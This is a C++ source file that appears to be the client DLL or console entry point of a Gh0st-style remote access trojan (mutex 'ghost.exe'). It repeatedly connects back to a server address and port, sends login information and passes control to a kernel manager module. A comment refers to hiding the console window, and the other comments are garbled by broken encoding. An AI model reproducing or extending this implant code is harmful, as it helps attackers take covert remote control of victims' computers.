// ClientDll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "Common.h"
#include "IOCPClient.h"
#include <IOSTREAM>
#include "LoginServer.h"
#include "KernelManager.h"
using namespace std;

// Զ�̵�ַ
char  g_szServerIP[MAX_PATH] = {0};  
unsigned short g_uPort = 0; 

// Ӧ�ó���״̬��1-���ض��˳� 2-���ض��˳���
BOOL g_bExit = 0;
// �����߳�״̬
BOOL g_bThreadExit = 0;

HINSTANCE  g_hInstance = NULL;        
DWORD WINAPI StartClient(LPVOID lParam);

#if _CONSOLE

enum { E_RUN, E_STOP } status;

// ���ؿ���̨
// �ο���https://blog.csdn.net/lijia11080117/article/details/44916647
// step1: ��������"�߼�"������ڵ�ΪmainCRTStartup
// step2: ��������"ϵͳ"����ϵͳΪ����
// ���

BOOL CALLBACK callback(DWORD CtrlType)
{
	if (CtrlType == CTRL_CLOSE_EVENT)
	{
		g_bExit = true;
		while (E_RUN == status)
			Sleep(20);
	}
	return TRUE;
}

int main(int argc, const char *argv[])
{
	status = E_RUN;
	if (argc < 3)
	{
		std::cout<<"��������.\n";
		return -1;
	}
	HANDLE hMutex = ::CreateMutexA(NULL, TRUE, "ghost.exe");
	if (ERROR_ALREADY_EXISTS == GetLastError())
	{
		CloseHandle(hMutex);
		return -2;
	}
	
	SetConsoleCtrlHandler(&callback, TRUE);
	const char *szServerIP = argv[1];
	int uPort = atoi(argv[2]);
	printf("[server] %s:%d\n", szServerIP, uPort);

	memcpy(g_szServerIP,szServerIP,strlen(szServerIP));
	g_uPort = uPort;

	do{
		g_bExit = 0;
		HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)StartClient,NULL,0,NULL);

		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
	}while (E_RUN == status && 1 != g_bExit);

	status = E_STOP;

	CloseHandle(hMutex);
	return 0;
}
#else

BOOL APIENTRY DllMain( HINSTANCE hInstance, 
					  DWORD  ul_reason_for_call, 
					  LPVOID lpReserved
					  )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:	
	case DLL_THREAD_ATTACH:
		{
			g_hInstance = (HINSTANCE)hInstance; 

			break;
		}		
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

// ��������һ��ghost
extern "C" __declspec(dllexport) void TestRun(char* szServerIP,int uPort)
{
	g_bExit = false;
	memcpy(g_szServerIP,szServerIP,strlen(szServerIP));
	g_uPort = uPort;

	HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)StartClient,NULL,0,NULL);
#ifdef _DEBUG
	WaitForSingleObject(hThread, 200);
#else
	WaitForSingleObject(hThread, INFINITE);
#endif
	CloseHandle(hThread);
}

// ֹͣ����
extern "C" __declspec(dllexport) void StopRun() { g_bExit = true; }

// �Ƿ�ɹ�ֹͣ
extern "C" __declspec(dllexport) bool IsStoped() { return g_bThreadExit; }

// �Ƿ��˳��ͻ���
extern "C" __declspec(dllexport) bool IsExit() { return 1 == g_bExit; }

#endif

DWORD WINAPI StartClient(LPVOID lParam)
{
	IOCPClient  *ClientObject = new IOCPClient();

	g_bThreadExit = false;
	while (!g_bExit)
	{
		DWORD dwTickCount = GetTickCount();
		if (!ClientObject->ConnectServer(g_szServerIP, g_uPort))
		{
			for (int k = 500; !g_bExit && --k; Sleep(10));
			continue;
		}
		//׼����һ������
		SendLoginInfo(ClientObject, GetTickCount()-dwTickCount); 

		CKernelManager	Manager(ClientObject);   
		bool	bIsRun = 0;
		do 
		{
			Sleep(200);

			bIsRun  = ClientObject->IsRunning();

		} while (bIsRun && ClientObject->IsConnected() && !g_bExit);
	}

	cout<<"StartClient end\n";
	delete ClientObject;
	g_bThreadExit = true;

	return 0;
} 
